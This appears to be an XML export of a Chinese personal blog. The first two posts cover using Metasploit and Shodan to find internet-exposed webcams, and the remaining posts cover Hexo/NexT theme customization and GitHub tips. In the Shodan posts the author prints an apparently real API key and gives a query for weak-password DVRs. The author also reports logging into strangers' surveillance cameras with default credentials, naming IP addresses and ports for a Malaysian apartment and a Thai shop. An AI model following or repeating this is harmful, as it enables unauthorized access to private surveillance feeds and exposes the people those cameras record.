  <entry>
    <title>在kali虚拟机中使用msf的shodan“入侵”网络摄像头</title>
    <url>/shodankaliuse.html</url>
    <content><![CDATA[<h3 id="在kali虚拟机中使用msf的shodan入侵网络摄像头"><a href="#在kali虚拟机中使用msf的shodan入侵网络摄像头" class="headerlink" title="在kali虚拟机中使用msf的shodan入侵网络摄像头"></a>在kali虚拟机中使用msf的shodan入侵网络摄像头</h3><h5 id="实验步骤："><a href="#实验步骤：" class="headerlink" title="实验步骤："></a>实验步骤：</h5><p>1.0 打开msf5，第一次使用msf5：<br>①、先启动postgresql数据库，这个是msf5 的默认数据库。<br>service postgresql start<br><img src="/images/shodankaliuse/1.png" alt="3b7295cbd980d3f391c8bd41cfc08cec.png"></p>
<span id="more"></span>

<p>②、启动msf控制台<br>msfconsole<br><img src="/images/shodankaliuse/2.png" alt="14e36693a7df2b116799a94faffbaba9.png"><br>将 postgresql数据库设置kaili成开机自启：<br>update-rc.d postgresql enable<br><img src="/images/shodankaliuse/3.png" alt="2340662b3599b29c67ae81452bd9f608.png"></p>
<p>2.0 输入命令use auxiliary/gather/shodan_search<br><img src="/images/shodankaliuse/4.png" alt="696f1b5573cc4d826e8d7c8bf34a3ee6.png"></p>
<p>3.0然后输入show options看看有哪些需要设置<br><img src="/images/shodankaliuse/5.png" alt="d16c1a518ab2d963954c18e864fd0ad8.png"></p>
<p>主要需要设置的是SHODAN_APIKEY</p>
<p>5.0 我们要登陆到shodan获取apikey<br>登陆网页shodan，注册一个账号<br><img src="/images/shodankaliuse/6.png" alt="81ac583ba68a8510ec38bb232dd34326.png"></p>
<p>6.0 设置SHODAN_APIKEY<br>set SHODAN_APIKEY xxxxxxxxxxxx</p>
<p>   set SHODAN_APIKEY dIiUHk4U0eWViHG0lAPhovyXACxNBm04<br>再输入命令：set QUERY “webcamxp”<br><img src="/images/shodankaliuse/7.png" alt="328e48ab5c51c0d7f600737b16e6dd0b.png"></p>
<p>最后输入run等待查询结果：<br>报错：<br><img src="/images/shodankaliuse/8.png" alt="4adf1d17d5d60cb2a2094995c18b6d96.png"></p>
]]></content>
      <tags>
        <tag>shodan</tag>
      </tags>
  </entry>
  <entry>
    <title>互联网上最可怕的搜索引擎(Shodan)介绍及简单使用</title>
    <url>/shodanuse.html</url>
    <content><![CDATA[<h2 id="互联网上最可怕的搜索引擎-Shodan-介绍及简单使用"><a href="#互联网上最可怕的搜索引擎-Shodan-介绍及简单使用" class="headerlink" title="互联网上最可怕的搜索引擎(Shodan)介绍及简单使用"></a><strong>互联网上最可怕的搜索引擎(Shodan)介绍及简单使用</strong></h2><h4 id="Shodan简介"><a href="#Shodan简介" class="headerlink" title="Shodan简介"></a>Shodan简介</h4><p>CNNMoney的一篇文章写道，虽然目前人们都认为谷歌是最强劲的搜索引擎，但Shodan才是互联网上最可怕的搜索引擎。下面简单介绍一下shodan和它的极其强大乃至恐怖的搜索能力。</p>
<span id="more"></span>
<p>与谷歌不同的是，Shodan不是在网上搜索网址，而是直接进入互联网的背后通道。Shodan可以说是一款“黑暗”谷歌，一刻不停的在寻找着所有和互联网关联的服务器、摄像头、打印机、路由器等等。每个月Shodan都会在大约5亿个服务器上日夜不停地搜集信息。<br>Shodan所搜集到的信息是极其惊人的。凡是链接到互联网的红绿灯、安全摄像头、家庭自动化设备以及加热系统等等都会被轻易的搜索到。Shodan的使用者曾发现过一个水上公园的控制系统，一个加油站，甚至一个酒店的葡萄酒冷却器。而网站的研究者也曾使用Shodan定位到了核电站的指挥和控制系统及一个粒子回旋加速器。<br>Shodan真正值得注意的能力就是能找到几乎所有和互联网相关联的东西。而Shodan真正的可怕之处就是这些设备几乎都没有安装安全防御措施，其可以随意进入。<br>Rapid 7 的首席安全官HD Moore,表示：你可以用一个默认密码登陆几乎一半的互联网。就安全而言，这是一个巨大的失误。<br>如果你搜索“默认密码”的话，你会发现无数的打印机，服务器及系统的用户名都是“admin”，密码全都是“1234”。还有很多系统根本不需要认证，你所需要做的就是用浏览器进行链接。所以如果你在使用默认密码的话，请现在就改换新的密码。</p>
<h3 id="Shodan简单使用"><a href="#Shodan简单使用" class="headerlink" title="Shodan简单使用"></a>Shodan简单使用</h3><p><a href="https://www.cnblogs.com/student-programmer/p/6732873.html">参考网址</a><br>在主页的搜索框中输入想要搜索的内容即可，例如下面我搜索 “SSH”：<img src="/images/shodanuse/1.png" alt="75338c870de76be92b48ef4b0acc1f31.png"><br>上图的搜索结果包含两个部分，左侧是大量的汇总数据包括：<br>Results map – 搜索结果展示地图<br>Top services (Ports) – 使用最多的服务/端口<br>Top organizations (ISPs) – 使用最多的组织/ISP<br>Top operating systems – 使用最多的操作系统<br>Top products (Software name) – 使用最多的产品/软件名称<br>随后，在中间的主页面我们可以看到包含如下的搜索结果：<br>IP 地址<br>主机名<br>ISP<br>该条目的收录收录时间<br>该主机位于的国家<br>Banner 信息</p>
<p>想要了解每个条目的具体信息，只需要点击每个条目下方的 details 按钮即可。此时，URL 会变成这种格式 <a href="https://www.shodan.io/host/[IP]，所以我们也可以通过直接访问指定的">https://www.shodan.io/host/[IP]，所以我们也可以通过直接访问指定的</a> IP 来查看详细信息。<br><img src="/images/shodanuse/2.png" alt="8851d535ee54b6ec7be7606a8d974de9.png"></p>
<p>上图中我们可以从顶部在地图中看到主机的物理地址，从左侧了解到主机的相关信息，右侧则包含目标主机的端口列表及其详细信息。</p>
<p>使用搜索过滤如果像前面单纯只使用关键字直接进行搜索，搜索结果可能不尽人意，那么此时我们就需要使用一些特定的命令对搜索结果进行过滤，常见用的过滤命令如下所示：</p>
<blockquote>
<p>hostname：搜索指定的主机或域名，例如 hostname:”google”<br>port：搜索指定的端口或服务，例如 port:”21”<br>country：搜索指定的国家，例如 country:”CN”<br>city：搜索指定的城市，例如 city:”Hefei”<br>org：搜索指定的组织或公司，例如 org:”google”<br>isp：搜索指定的ISP供应商，例如 isp:”China Telecom”<br>product：搜索指定的操作系统/软件/平台，例如 product:”Apache httpd”<br>version：搜索指定的软件版本，例如 version:”1.6.2”<br>geo：搜索指定的地理位置，参数为经纬度，例如 geo:”31.8639, 117.2808”<br>before/after：搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:”11-11-15”<br>net：搜索指定的IP地址或子网，例如 net:”210.45.240.0/24”</p>
</blockquote>
<h6 id="搜索实例"><a href="#搜索实例" class="headerlink" title="搜索实例"></a>搜索实例</h6><p>查找位于山东的 Apache 服务器：<br>apache city:”Shandon”<br>查找位于国内的 Nginx 服务器：<br>nginx country:”CN”<br>查找 GWS(Google Web Server) 服务器：<br>“Server: gws” hostname:”google”<br>查找指定网段的华为设备：<br>huawei net:”61.191.146.0/24”<br>如上通过在基本关键字后增加指定的过滤关键字，能快速的帮助发现我们感兴趣的内容。<br>当然，还有更快速更有意思的方法，那就是点击 Shodan 搜索栏右侧的 “Explore” 按钮，就会得到很多别人分享的搜索语法，你问我别人分享的语法有什么好玩的？那咱们就随便来看看吧：<br><img src="/images/shodanuse/3.png" alt="0d746d90d70bf51005aafc89c9005b5f.png"><br><strong>高能！</strong><br>随便选取一个名为“NetSureveillance Web”的用户分享语法，从下面的描述信息我们基本就能得知这就是一个弱密码的漏洞，为了方便测试让我们把语法在增加一个国家的过滤信息，最终语法如下：<br>Server: uc-httpd 1.0.0 200 OK Country:”CN”<br><img src="/images/shodanuse/4.png" alt="5d371cabf338d0bc48b34d30d2612715.png"><br>随便选取一个页面进去输入，使用admin账号和空密码就能顺利进入了!<br><img src="/images/shodanuse/5.png" alt="f0f300cb8583697bdb625bd3ebaa57e0.png"></p>
<p>某马来西亚一家公寓的监控，admin+123456进入<br>60.50.115.98:60001<br><img src="/images/shodanuse/6.png" alt="c7f36cc5b5a67cf58ecdd7c96b996e49.png"></p>
<p>泰国一家商店监控，admin+空<br><a href="http://124.121.168.78:60001">http://124.121.168.78:60001</a><br><img src="/images/shodanuse/7.png" alt="983cf49b5a01ce2ce676aeb5ef23ab81.png"></p>
<h6 id="在shodan中搜索JAWS-1-0，会查到一批admin-空密码（或123456等弱密码）即可进入的监控"><a href="#在shodan中搜索JAWS-1-0，会查到一批admin-空密码（或123456等弱密码）即可进入的监控" class="headerlink" title="在shodan中搜索JAWS/1.0，会查到一批admin+空密码（或123456等弱密码）即可进入的监控"></a>在shodan中搜索JAWS/1.0，会查到一批admin+空密码（或123456等弱密码）即可进入的监控</h6><p>慎用！！！</p>
]]></content>
      <tags>
        <tag>shodan</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo+NexT(v7.72)博客主题美化，打造“超炫”网站（二）</title>
    <url>/nextthemebeautify2.html</url>
    <content><![CDATA[<p>先分享一点小经验</p>
<h5 id="修改了模板，但是没有生效？"><a href="#修改了模板，但是没有生效？" class="headerlink" title="修改了模板，但是没有生效？"></a>修改了模板，但是没有生效？</h5><p>修改了模板以后不生效，建议先<strong>hexo clean</strong>，然后再hexo generate。只执行hexo generate，可能模板后者静态文件不会被替换。<br>知道晚了，以为设置错误，两天后hexo clean，然后奇迹出现了！！！</p>
<h6 id="本地和网站不同步？hexo-clean"><a href="#本地和网站不同步？hexo-clean" class="headerlink" title="本地和网站不同步？hexo clean!"></a>本地和网站不同步？hexo clean!</h6><p>下面是接上一篇的更多网站美化功能</p>
<span id="more"></span>

<h3 id="8-在网站底部添加访问量"><a href="#8-在网站底部添加访问量" class="headerlink" title="(8)在网站底部添加访问量"></a>(8)在网站底部添加访问量</h3><p>进入<code>\themes\next\layout\ _partials\footer.swig</code>文件顶部第一行添加</p>
<pre><code>&lt;script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"&gt;&lt;/script&gt;</code></pre><p>2.搜索</p>
<pre><code>{% if theme.footer.powered.enable %}</code></pre><p>在这个位置上添加以下代码</p>
<pre><code>&lt;div class="powered-by"&gt;
&lt;i class="fa fa-user-md"&gt;&lt;/i&gt;&lt;span id="busuanzi_container_site_pv"&gt;总访问量&lt;span id="busuanzi_value_site_pv"&gt;&lt;/span&gt;次&lt;/span&gt;
    &lt;span class="post-meta-divider"&gt;,&lt;/span&gt;
    &lt;span id="busuanzi_container_site_uv"&gt;我的第&lt;span id="busuanzi_value_site_uv"&gt;&lt;/span&gt;位朋友&lt;/span&gt;
    &lt;span class="post-meta-divider"&gt;|&lt;/span&gt;
&lt;/div&gt;</code></pre><p>注：这里的id值可以选择两种</p>
<pre><code># busuanzi_value_site_uv  表示用户连续点击n篇文章，只记录1次访客数# busuanzi_value_site_pv  表示用户连续点击n篇文章，记录+n次访问量
# 这里对应的是2上的id值</code></pre><p>效果如下：<br>本地访问会出现人数爆棚现象，正常，部署到github上会恢复正常<br><img src="/images/beautify2/1.png" alt="bc3439ac113ed8ca432e2b3ec0f6d5ca.png"></p>
<h3 id="9-添加打赏功能"><a href="#9-添加打赏功能" class="headerlink" title="(9)添加打赏功能"></a>(9)添加打赏功能</h3><p>在主题配置文件中搜索Reward，改为如下形式<br><img src="/images/beautify2/2.png" alt="e3897be70d0db4287935e8a4489568de.png"><br>效果：<br><img src="/images/beautify2/3.png" alt="5f98934f4d64ccd9e1159d9ee4bbcc77.png"></p>
<blockquote>
<p><a href="https://segmentfault.com/a/1190000016527304?utm_source=tag-newest">参考文章</a></p>
</blockquote>
<h3 id="10-添加阅读统计及评论"><a href="#10-添加阅读统计及评论" class="headerlink" title="(10)添加阅读统计及评论"></a>(10)添加阅读统计及评论</h3><p><a href="https://segmentfault.com/a/1190000016565949">参考文章</a></p>
<h5 id="添加阅读次数统计"><a href="#添加阅读次数统计" class="headerlink" title="添加阅读次数统计"></a>添加阅读次数统计</h5><p>需要用到leancloud网站，<br>1.注册一个账号<br>2.创建应用(开发版)<br>3.进入设置页面<br>4.应用key<br>将App ID、App Key 配置到next/_config.yml中leancloud_visitors</p>
<pre><code>leancloud_visitors:
 enable: true 设置为true 默认为false
 app_id:  #你的App ID，注意冒号后面空格
 app_key:  #你的App Key，注意冒号后面空格
 Dependencies:  https://github.com/theme-next/hexo-leancloud-counter-security #设置依赖
 security: true #如果您不关心lc计数器中的安全性并且只想直接使用它（没有hexo-leancloud-counter-security插件），请将`security`设置为`false`。  betterPerformance: true #更好的性能</code></pre><p>5.在leancloud存储的位置创建Class,必须命名为Counter<br><img src="/images/beautify2/4.png" alt="a1021618af30065d9ef1cf3b5eb0ab48.png"><br>6.查看后台统计数据<br><img src="/images/beautify2/5.png" alt="542d40c0448b9bcbf050c9b5bd509508.png"></p>
<h5 id="添加评论"><a href="#添加评论" class="headerlink" title="添加评论"></a>添加评论</h5><p>选择的是Valine系统<br>进入leancloud<br>1.创建应用<br><img src="/images/beautify2/6.png" alt="f3cfd885cc0e436d58d6ac13ae2c7cef.png"><br>2.进入设置页面<br><img src="/images/beautify2/7.png" alt="4749312c24ca3633a258d13d15459ae9.png"><br>3.应用key<br><img src="/images/beautify2/8.png" alt="986351dd5c71bed5c9fefb54abf8737f.png"><br>4.在<code>next/_config.yml</code>进行一下配置</p>
<pre><code>valine:
  enable: true # 设置为true，默认为false
  appid:  # 将应用key的App ID设置在这里
  appkey: # 将应用key的App Key设置在这里
  notify: true# 邮箱通知 , https://github.com/xCss/Valine/wiki，默认为false
  verify: true# 验证码 默认为false 
  placeholder: Just go go ^_^ # 初始化评论显示，根据自己修改，这里默认， 
  avatar: wavatar # 头像风格，默认为mm，可进入网址：https://valine.js.org/visitor.html查看头像设置，这里有许多头像风格，进行设置  
  guest_info: nick,mail,link # 自定义评论标题  
  pageSize: 10 # 分页大小，10页就自动分页  
  visitor: true # 是否允许游客评论 ，进入官网查看设置：https://valine.js.org/visitor.html</code></pre><p>完成<br>6.在后台查看评论数据<br>在valine后台，存储位置中的数据里面创建Class，名称必须为命名为Comment<br><img src="/images/beautify2/9.png" alt="dba10b9c2f501621d0243fa4c0bedbbe.png"></p>
<blockquote>
<p>注：选择valine评论系统是因为支持国内网络，不需要连接外网（翻墙）就可以进行显示评论系统，而且很好管理，页面简单。</p>
</blockquote>
<h3 id="11-read-more以及压缩文章"><a href="#11-read-more以及压缩文章" class="headerlink" title="(11)read more以及压缩文章"></a>(11)read more以及压缩文章</h3><pre><code>&lt;!-- more --&gt;</code></pre><p>指令加到文章哪个部分，就从哪部分向下不显示</p>
<h3 id="12-网页底部的动态桃心图像"><a href="#12-网页底部的动态桃心图像" class="headerlink" title="(12)网页底部的动态桃心图像"></a>(12)网页底部的动态桃心图像</h3><p><strong>修改主题配置文件:</strong></p>
<pre><code>icon:
    name: heart      #如果name的值为heart表示引用fontawesome网站上的心形图标
    animated: true     #如果想用动态图标应该将animated的值设为true
    color: "#ff0000"     #图标的色--用16进制数  </code></pre><p>效果如下：<br><img src="/images/beautify2/10.png" alt="c3704c2babdf19d93e17ddb1f04597c8.png"><br>（心还在跳）</p>
]]></content>
      <categories>
        <category>hexo+github博客建立与美化</category>
      </categories>
      <tags>
        <tag>next主题</tag>
        <tag>next主题美化</tag>
        <tag>网站添加功能</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo+NexT(v7.72)博客主题美化，打造“超炫”网站（一）</title>
    <url>/nextthemebeautify1.html</url>
    <content><![CDATA[<p>安装好一个基本的next主题框架显然是有点简陋，许多普通网站的功能基本没有<br>于是我亲试了一些常见美化博客的方法，让你的博客变得更“炫”！<br><strong>以下效果均在我的博客<code>marmalade.vip</code>中能够呈现出来</strong></p>
<blockquote>
<p>在开始“大展身手”前，要注意一点：<br>每添加了一项新代码或功能后不要着急部署到github里，<br>健康的方式是用<br>hexo s -p 5555<br>指令开启5555端口，然后浏览器输入127.0.0.1:5555或localhost:5555便可浏览网站，保存之后再刷新本地浏览的页面会相应修改，<br>等调试无误后才可用<br>hexo clean<br>hexo g -d<br>指令部署，这样能够防止出错时及时检查并修改，而不至于网站崩溃。</p>
</blockquote>
<span id="more"></span>
<h3 id="1-目录中创建标签和分类菜单及应用"><a href="#1-目录中创建标签和分类菜单及应用" class="headerlink" title="(1)目录中创建标签和分类菜单及应用"></a>(1)目录中创建标签和分类菜单及应用</h3><p>博客目录下hexo new page “tags”<br>然后在source文件夹下出现tags<br><img src="/images/beautify1/1.png" alt="d8a4349c886b117733dce99910a5a540.png"><br>打开对应的index，改为<br><img src="/images/beautify1/2.png" alt="b60a2cc94f7f85a30a8725f88622557c.png"></p>
<p>同理hexo new page “categories”<br><img src="/images/beautify1/3.png" alt="b0b1f3f16bafa03f1d188a0831acfb57.png"><br>在主题配置文件中找到menu，去掉对应井号即可<br><img src="/images/beautify1/4.png" alt="b0fcd6d7938cf576b9b8d75ac61e0ed0.png"><br>想要在某篇文章中添加标签或分类只需在文章前面加上下图效果<br><img src="/images/beautify1/5.png" alt="f289d5e5a2d86c422e255cd05d6b2aee.png"></p>
<h3 id="2-标签美化"><a href="#2-标签美化" class="headerlink" title="(2)标签美化"></a>(2)标签美化</h3><p><img src="/images/beautify1/6.png" alt="b658164ad4ee428656cb8d6b0f11a74d.png"><br>井号样式不好看，改为图标</p>
<p>在博客项目中找到<code>/themes/next/layout/_macro/post.swig</code>，搜索 rel=”tag”，将 #号 换成</p>
<pre><code>&lt;i class="fa fa-tag"&gt;&lt;/i&gt;</code></pre><p>完成样子：<br><img src="/images/beautify1/7.png" alt="7479a2848622b7cf6f36a56ac783cbdc.png"></p>
<h3 id="3-添加点击爱心效果"><a href="#3-添加点击爱心效果" class="headerlink" title="(3)添加点击爱心效果"></a>(3)添加点击爱心效果</h3><p>在页面中点击任意位置实现蹦出爱心效果<br>在 <code>/themes/next/source/js</code>下新建文件 clicklove.js，接着把如下代码复制粘贴到 clicklove.js 文件中，代码如下：</p>
<pre><code>!function(e,t,a){function n(){c(".heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}"),o(),r()}function r(){for(var e=0;e&lt;d.length;e++)d[e].alpha&lt;=0?(t.body.removeChild(d[e].el),d.splice(e,1)):(d[e].y--,d[e].scale+=.004,d[e].alpha-=.013,d[e].el.style.cssText="left:"+d[e].x+"px;top:"+d[e].y+"px;opacity:"+d[e].alpha+";transform:scale("+d[e].scale+","+d[e].scale+") rotate(45deg);background:"+d[e].color+";z-index:99999");requestAnimationFrame(r)}function o(){var t="function"==typeof e.onclick&amp;&amp;e.onclick;e.onclick=function(e){t&amp;&amp;t(),i(e)}}function i(e){var a=t.createElement("div");a.className="heart",d.push({el:a,x:e.clientX-5,y:e.clientY-5,scale:1,alpha:1,color:s()}),t.body.appendChild(a)}function c(e){var a=t.createElement("style");a.type="text/css";try{a.appendChild(t.createTextNode(e))}catch(t){a.styleSheet.cssText=e}t.getElementsByTagName("head")[0].appendChild(a)}function s(){return"rgb("+~~(255*Math.random())+","+~~(255*Math.random())+","+~~(255*Math.random())+")"}var d=[];e.requestAnimationFrame=function(){return e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||function(e){setTimeout(e,1e3/60)}}(),n()}(window,document);</code></pre><p>在 <code>\themes\next\layout\_layout.swig</code> 文件末尾添加：</p>
<pre><code>&lt;!-- 页面点击小红心 --&gt; &lt;script type="text/javascript" src="/js/clicklove.js"&gt;&lt;/script&gt;</code></pre><h3 id="4-网站头像修改"><a href="#4-网站头像修改" class="headerlink" title="(4)网站头像修改"></a>(4)网站头像修改</h3><p>主题配置文件中找到avatar<br>全变成true，url里写自己图像的路径<br><img src="/images/beautify1/8.png" alt="4304959957ae1fde9391e0bde50f21af.png"></p>
<h3 id="5-网站图标修改"><a href="#5-网站图标修改" class="headerlink" title="(5)网站图标修改"></a>(5)网站图标修改</h3><p>在next主题配置文件中找favicon:<br>路径改为自己的图标所在<br>最好路径形式为(/images/…)<br>然后将图标保存在根目录下的source/images文件夹里就可</p>
<h3 id="6-添加站内搜索"><a href="#6-添加站内搜索" class="headerlink" title="(6)添加站内搜索"></a>(6)添加站内搜索</h3><p>由于可能我需要快速查找相关文章，那么就需要添加站内搜索。</p>
<p>1.安装站内搜索插件<br>  npm install hexo-generator-searchdb –save<br>2.在根目录下的_config.yml添加</p>
<pre><code>#表示站内搜索search:  
    path: search.xml
    field: post
    format: html
    limit: 10000</code></pre><p>3.在<code>themes/next/_config.yml</code>文件中搜索local_search,进行设置</p>
<pre><code>local_search:  enable: true  #设置为true  
trigger: auto  # auto /  manual，auto 自动搜索、manual：按回车[enter ]键手动搜索  
top_n_per_article: 1  
unescape: true</code></pre><h3 id="7-设置背景动画样式"><a href="#7-设置背景动画样式" class="headerlink" title="(7)设置背景动画样式"></a>(7)设置背景动画样式</h3><p>NexT里面有几种动画背景样式canvas_nest、three_waves、canvas_lines、canvas_sphere等<br><strong>canvas_nest设置</strong><br>1.cd进入next文件夹下<br>2.下载安装 canvas_nest module 执行</p>
<pre><code>$ git clone https://github.com/theme-next/theme-next-canvas-nest source/lib/canvas-nest</code></pre><p>3.在 <code>/themes/next/source/lib</code>查看会看到canvas_nest文件夹<br>4.在<code>/themes/next/_config.yml</code>设置canvas_nest: true<br>效果见主页背景</p>
]]></content>
      <categories>
        <category>hexo+github博客建立与美化</category>
      </categories>
      <tags>
        <tag>next主题</tag>
        <tag>next主题美化</tag>
        <tag>网站添加功能</tag>
      </tags>
  </entry>
  <entry>
    <title>next主题安装配置与文章上传</title>
    <url>/nextthemesetup.html</url>
    <content><![CDATA[<h2 id="安装NexT主题"><a href="#安装NexT主题" class="headerlink" title="安装NexT主题"></a>安装NexT主题</h2><p>介绍一个公认最常用的next最新版主题以及安装使用方法。<br><a href="http://theme-next.iissnan.com/getting-started.html">参考next官网教程</a></p>
<span id="more"></span>
<h5 id="下载next主题包"><a href="#下载next主题包" class="headerlink" title="下载next主题包"></a>下载next主题包</h5><p><a href="https://github.com/theme-next/hexo-theme-next/releases/tag/v7.7.2">next-v7.7.2压缩包下载地址</a><br><img src="/images/3/1.png" alt="838e7c57786cd645be77a5c68f8a2b52.png"><br>下载zip，<br>解压所下载的压缩包至站点的 themes 目录下， 并将 解压后的文件夹名称（hexo-theme-next-0.4.0）更改为 next。</p>
<h5 id="启用主题"><a href="#启用主题" class="headerlink" title="启用主题"></a>启用主题</h5><p>当 下载 完成后，打开 站点配置文件（blogname/config.yml）， 找到 theme 字段，注释掉默认的主题并将其值更改为 next。<br><img src="/images/3/2.png" alt="2453faafe127e7b38369368dcaf1d1a0.png"></p>
<h5 id="选择-Scheme（风格）"><a href="#选择-Scheme（风格）" class="headerlink" title="选择 Scheme（风格）"></a>选择 Scheme（风格）</h5><p>NexT 提供三种不同风格主题方案：<br><img src="/images/3/3.png" alt="c49bc7a9f1d1d7c6889e0f74bd1e4880.png"><br>Scheme 的切换通过更改 主题配置文件，搜索 scheme 关键字。 你会看到有三行 scheme 的配置，将你需用启用的 scheme 前面注释 # 去除即可。</p>
<pre><code>#scheme: Muse 
#scheme: Mist 
#scheme: Pisces
scheme: Gemini</code></pre><p>然后网站根目录下运行<br>hexo clean<br>hexo g -d<br>就可以等待查看不同风格效果了。</p>
<h2 id="博客文章"><a href="#博客文章" class="headerlink" title="博客文章"></a>博客文章</h2><h5 id="向博客中添加一篇文章"><a href="#向博客中添加一篇文章" class="headerlink" title="向博客中添加一篇文章"></a>向博客中添加一篇文章</h5><p>hexo new “标题”<br>或hexo new 标题 (标题不能有空格，若要加空格用上面形式)<br>新建好的自动保存在博客文件夹下的source/_posts里，以md形式创立，故写文章要用到markdown语法。</p>
<blockquote>
<p>管理博客上传时间：可在网站配置文件中（_config.yml）找到并改为以下格式</p>
<blockquote>
<p><strong>new_post_name: :year-:month-:day-:title.md</strong><br>博文保存标题会添加时间标注</p>
</blockquote>
</blockquote>
<h5 id="文档中添加图片："><a href="#文档中添加图片：" class="headerlink" title="文档中添加图片："></a>文档中添加图片：</h5><p>这里为了好整理把图片统一放在source/images文件夹里（没有的新建）<br>固定格式：</p>
<pre><code>插入本地图片：
![](/images/图片的名字)
或
插入网络图片：
![](图片的网址)</code></pre><p>中括号里也可以加提示性语言，这样鼠标长时间放在图片上就会显示文字<br>也支持用HTML标签来插入</p>
<pre><code>&lt;img src="路径或地址" alt="提示语言"&gt;</code></pre><p>alt也可省略</p>
<blockquote>
<p>注：markdown格式加感叹号直接显示图片<br>不加感叹号则显示蓝色文字，点开得图片<br>（可以自己尝试一下区别）</p>
</blockquote>
<p><strong>遇到的小麻烦</strong><br><img src="/images/3/4.png" alt="f977c13be2a2b035c3a647a773fc328c.png"><br>百度YAMLException: can not read a block mapping entry; a multiline key may not be an implicit key at line 8, column 1:<br>发现tag：后要加空格即可解决问题</p>
<h5 id="文档中添加网页链接"><a href="#文档中添加网页链接" class="headerlink" title="文档中添加网页链接"></a>文档中添加网页链接</h5><pre><code>[文字描述](网址，如www.baidu.com)</code></pre>]]></content>
      <categories>
        <category>hexo+github博客建立与美化</category>
      </categories>
      <tags>
        <tag>next主题</tag>
        <tag>博客文章</tag>
        <tag>markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>用阿里云建造一个属于自己的域名</title>
    <url>/zidingyiyuming.html</url>
    <content><![CDATA[<h3 id="自定义域名"><a href="#自定义域名" class="headerlink" title="自定义域名"></a>自定义域名</h3><p>依托github搭建起来的博客域名格式一般是固定的（尾端.github.io），无法做到自己自定义那种常见的baidu.com那种简洁好记的域名<br>网上自定义域名方法有些描述的模糊不清，让我进了不少坑，于是便记录下自己详细的自定义域名的过程</p>
<span id="more"></span>
<p>先在根目录/source文件夹下新建一个CNAME文件，存域名<br>（尽量不加www，这样以后访问加不加www.都可以访问）<br>cmd博客目录下执行hexo g -d<br><img src="/images/2%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D/Image1.png" alt="32e66fc5fd4da0624c29aef589c095a5.png"><br><a href="https://www.zhihu.com/question/31377141">借鉴知乎问题</a><br>阿里云实名注册域名后ping一下marmalad0.github.io<br>得到一个IP地址<br><img src="/images/2%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D/Image2.png" alt="84d76b43931c1c3fa11cd48212aa163d.png"><br>点击阿里云域名解析，添加两条记录<br>格式如下：<br><img src="/images/2%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D/Image3.png" alt="dcc3ad3502c4fbdbe08f89e8e11272b0.png"><br>然后在自己的github上打开建的仓库（用户名.github.io）<br>点击settings找到<br>Custom domain写上自己自定义的域名（一般自动就有），再在https上打一个勾<br><img src="/images/2%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9F%9F%E5%90%8D/Image4.png" alt="a11d7497d345e1f008deca099dcaa1de.png"><br>成功</p>
]]></content>
      <categories>
        <category>hexo+github博客建立与美化</category>
      </categories>
      <tags>
        <tag>自定义域名</tag>
        <tag>域名解析</tag>
      </tags>
  </entry>
  <entry>
    <title>解决github下载慢加载慢的问题</title>
    <url>/jiejuegithubman.html</url>
    <content><![CDATA[<h3 id="解决github下载慢加载慢的问题"><a href="#解决github下载慢加载慢的问题" class="headerlink" title="解决github下载慢加载慢的问题"></a>解决github下载慢加载慢的问题</h3><p>github是国外网站，因此我们在访问的时候总会感觉加载非常的慢，要等好长时间<br>而且要是需要下载一些大的压缩包要等很长时间，于是我从网上各种方法里亲测出几个使用有效简便的方法来大幅提升github的速度。</p>
<span id="more"></span>
<p>方法一：dns查询github.com找到TTL值最小的IP输入到host里<br>即<br>13.229.188.59 <a href="https://github.com">https://github.com</a></p>
<blockquote>
<blockquote>
<p>注： <strong>host保存问题</strong><br>host路径：C:\Windows\System32\drivers\etc<br>用文本文档打开，后因没有权限无法保存，<br>可先用txt形式保存在桌面上，然后去掉.txt后缀，将原来的host文件删除，再把桌面上的复制粘贴到原位置即可</p>
</blockquote>
</blockquote>
<p>据说这种方法效果不明显（加强版见下）<br>方法二：打开码云<a href="https://gitee.com">https://gitee.com</a><br>注册登录<br>我的账号：marmalade0<br>密22<br>创建仓库，选择导入已有仓库并复制需要下载的git链接，点击创建然后下载</p>
<h5 id="后来发现github打不开"><a href="#后来发现github打不开" class="headerlink" title="后来发现github打不开"></a>后来发现github打不开</h5><p>找到方法一的加强版，亲测有效。<br><a href="https://www.cnblogs.com/yswenli/p/9419427.html">github打开慢，甚至打不开</a><br>复制上面的内容到hosts文件上，保存，解决！超快！<br>原因：</p>
<blockquote>
<blockquote>
<p>有人使用github后，在某些网络下发现打开慢，甚至打不开，这都是因为他是国外站；目前互联网的连接机制导致超过一定的路由节点的连接就会出现这个问题，解决办法就是直接告诉本机ip。不要先层层询问域名转ip，这样速度和连接的速度都可以进一步的大副提升，将下面的内容帖到本机的hosts文件中</p>
</blockquote>
</blockquote>
]]></content>
      <tags>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo+github博客建立过程及碰到的坑</title>
    <url>/hexoblogbuilding.html</url>
    <content><![CDATA[<p><strong><em>小白的一个不断碰坑填坑的过程</em></strong><br>过程确实很复杂，但是一步一步来，一个问题一个问题解决，成功只在朝夕！<br>参考<br><a href="https://zhuanlan.zhihu.com/p/26625249">GitHub+Hexo 搭建个人网站详细教程</a></p>
<span id="more"></span>
<h4 id="1、获得个人网站域名"><a href="#1、获得个人网站域名" class="headerlink" title="1、获得个人网站域名"></a>1、获得个人网站域名</h4><blockquote>
<blockquote>
<p>注册阿里云，买一个域名marmalade.vip（英文意思为橘子酱）</p>
</blockquote>
</blockquote>
